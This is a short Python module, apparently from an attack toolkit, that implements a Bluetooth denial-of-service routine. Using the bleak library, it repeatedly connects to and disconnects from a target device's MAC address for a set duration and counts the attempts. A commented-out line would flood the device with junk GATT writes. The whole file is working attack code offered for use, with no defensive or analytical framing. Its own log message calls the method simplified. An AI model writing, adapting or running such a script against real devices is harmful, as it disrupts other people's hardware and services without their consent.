# modules/bluetooth_dos.py
import asyncio
import logging
from bleak import BleakClient
from bleak.exc import BleakError
import time #Import Time

log = logging.getLogger(__name__)

async def attack(target_mac, duration=60):
  log.warning("Bluetooth DoS is highly dependent on the target device. This is a simplified example")
  start_time = time.time()
  end_time = start_time + duration
  attempts = 0

  while time.time() < end_time:
      try:
          async with BleakClient(target_mac) as client:
            #Cobalah melakukan sesuatu yang mungkin menyebabkan DoS
            try:
                #await client.write_gatt_char("SOME_NONEXISTENT_UUID", b"DoS data" * 100, response=False)
                await client.connect() #Hanya coba connect
                await client.disconnect()
                attempts+=1

            except BleakError as e:
                log.debug(f"Bleak error (expected in DoS): {e}") #Ini wajar

      except BleakError as e: #Tangani Bleak Error.
          log.debug(f"Bleak connection error (expected in DoS): {e}")  # Ini diharapkan dalam DoS
      except OSError as e: #Tangani jika Bluetooth Adapter Down.
            if e.errno == 10064:  # "Software caused connection abort" or similar
              log.debug("Bluetooth connection aborted (expected in DoS).")
            else:
              log.error(f"OS Error: {e}")
              break

      except Exception as e:
            log.exception(f"Unexpected error during Bluetooth DoS: {e}")
            break
  log.info(f"Bluetooth DoS attempts: {attempts}")